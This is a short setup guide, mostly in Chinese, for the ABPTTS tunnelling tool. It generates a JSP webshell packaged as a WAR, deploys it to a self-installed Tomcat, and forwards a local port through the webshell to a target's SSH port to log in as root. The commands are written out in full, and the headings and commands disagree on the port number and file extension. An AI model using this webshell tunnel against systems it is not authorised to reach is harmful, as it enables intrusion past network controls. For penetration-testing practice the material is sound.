## 运行abptts前必要条件

```shell
dnf install -y gcc python2 python2-devel
python2 -m pip install pycrypto
python2 -m pip install httplib2
```

```shell
git clone https://github.com/nccgroup/ABPTTS.git -c http.proxy=socks5://proxy.asants.com:10808

python2 abpttsfactory.py -o webshell
```

### download tomcat and jdk

```shell
wget https://repo1.maven.org/maven2/org/apache/tomcat/tomcat/8.0.47/tomcat-8.0.47.tar.gz
wget https://builds.openlogic.com/downloadJDK/openlogic-openjdk/8u382-b05/openlogic-openjdk-8u382-b05-linux-x64.tar.gz
```

### install tomcat and jdk
```shell
tar -zxvf tomcat-8.0.47.tar.gz
tar -zxvf openlogic-openjdk-8u382-b05-linux-x64.tar.gz
```

### configure env jdk

```shell
vim /etc/profile
```

### write content
```txt
export JAVA_HOME=/opt/asants/openlogic-openjdk-8u382-b05-linux-x64
export PATH=$PATH:$HOME/bin:$JAVA_HOME/bin
```

### reload config

```shell
source /etc/profile
```

### 最好打开一个新的会话，8版本的tomcat 读取jdk环境变量会失败

### abptts generate webshell/xxx.war to tomcat and start tomcat

```shell
cp -r webshell/xxx.war apache-tomcat-8.0.47/webapps/
sh apache-tomcat-8.0.47/bin/startup.sh
```

### 查看是否启动

```shell
curl http://ip:8080/xx/xx.jsp
```

### 访问本机的10227端口，相当于访问目标的22端口

```shell
python2 abpttsclient.py -c webshell/config.txt -u "http://ip:8080/xx/xx.jps" -f ip:20227/ip:22
```

### 访问服务器

```shell
ssh root@ip -p 20227
```

### docs

https://github.com/nccgroup/ABPTTS.git

https://www.jianshu.com/p/5187093a45e2
